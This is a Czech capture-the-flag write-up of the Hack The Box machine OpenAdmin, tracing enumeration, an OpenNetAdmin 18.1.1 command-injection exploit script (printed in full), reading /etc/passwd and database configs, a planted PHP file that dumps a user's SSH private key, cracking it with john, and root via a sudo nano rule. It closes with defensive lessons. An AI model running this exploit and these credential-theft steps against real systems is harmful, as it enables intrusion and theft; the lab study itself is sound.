---
layout: post
author: Tomáš Matějíček
title: "OpenAdmin"
date: 2020-01-04
tags: linux exploit sudo
---

## Úvod a kontext

OpenAdmin je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.

```bash
IP=10.10.10.171;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Úprava /etc/hosts

10.10.10.171	openadmin.htb

### Vyhledání složek na serveru

```bash
dirb http://openadmin.htb
```
```
=> DIRECTORY: http://openadmin.htb/artwork/
=> DIRECTORY: http://openadmin.htb/music/
```

### Vyhledání odkazů

```bash
wget -r -nd --delete-after -nv --ignore-tags=img,link,script http://openadmin.htb/music/
```
```
URL:http://openadmin.htb/ona/
```

### Identifikace webové aplikace

```bash
whatweb http://openadmin.htb/ona/
```
```
http://openadmin.htb/ona/ [200 OK] Apache[2.4.29], Cookies[ONA_SESSION_ID,ona_context_name], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Script[javascript,text/javascript], Title[OpenNetAdmin :: 0wn Your Network]
```

### Vyhledání exploitu

V této fázi ověřuji, zda zjištěná verze služby nebo chování aplikace odpovídá známé zranitelnosti, případně zda jde spíše o chybnou konfiguraci než o samostatnou CVE.

```bash
searchsploit -w opennetadmin
```

```
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                              |  URL
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                                                               | https://www.exploit-db.com/exploits/26682
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                | https://www.exploit-db.com/exploits/47772
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                 | https://www.exploit-db.com/exploits/47691
---------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
```

### Zobrazení a stažení exploitu

```bash
curl https://www.exploit-db.com/raw/47691
```
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```

```bash
curl https://www.exploit-db.com/raw/47691 -o opennetadmin-exploit.sh
```

### Vyhledání zapisovatelných složek

```bash
find / -type d -writable 2> /dev/null
```
```
/var/www/internal
```

## Analýza zjištění

### Zjištění uživatelů na cílovém serveru

Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.

```bash
cat /etc/passwd
```
```
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

### Zjištění přístupových údajů k databázi

Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.

```bash
cat ./local/config/database_settings.inc.php
```
```
$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => '__CENSORED__',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

### Zjištění konfigurace webu

Čtení konfiguračních a systémových artefaktů dává smysl tehdy, když pomůže potvrdit hypotézu o vztahu mezi účty, službami nebo uloženými tajemstvími.

```bash
cat /etc/apache2/sites-enabled/internal.conf
```
```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.

```
dos2unix opennetadmin-exploit.sh
chmod +x opennetadmin-exploit.sh
./opennetadmin-exploit.sh "http://openadmin.htb/ona/"
```

### Přihlášení k SSH pomocí nalezeného hesla

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.

```bash
ssh jimmy@openadmin.htb
```

### Přihlášení k SSH s přesměrováním portů

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.

```bash
ssh -L 52846:127.0.0.1:52846 jimmy@openadmin.htb
```

### Vytvoření PHP souboru který zobrazí privátní klíč uživatele joanna

```bash
echo "<?php echo shell_exec('cat /home/joanna/.ssh/id_rsa');" > /var/www/internal/key.php
```

### Zobrazení PHP souboru na interní webu a získání privátního klíče

<http://127.0.0.1:52846/key.php>
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
.....
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

### Slovníkový útok na heslo privátního klíče

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.

```
/usr/share/john/ssh2john.py OpenAdmin_joanna_id_rsa > OpenAdmin_joanna_id_rsa.john
/usr/sbin/john OpenAdmin_joanna_id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```
```text
__CENSORED__      (OpenAdmin_joanna_id_rsa)
```

### Přihlášení k SSH pomocí privátního klíče

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.

```bash
ssh -i OpenAdmin_joanna_id_rsa joanna@openadmin.htb
```

### Zobrazení obsahu souboru user.txt

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

```bash
cat user.txt
```
```text
__CENSORED__
```

## Eskalace oprávnění

### Zobrazení nastavení sudo

```bash
sudo -l
```
```
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

### Spuštění nano, zvýšení oprávnění a vypsání obsahu souboru root.txt

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.

```bash
sudo /bin/nano /opt/priv
```
```text
Ctrl+R
```
```text
Ctrl+X
```
```bash
cat /root/root.txt
```
__CENSORED__

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
- Pravidla `sudo` mají být co nejmenší a bez zbytečných možností typu `SETENV`, volného zápisu nebo vyhodnocování neověřeného vstupu.
- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
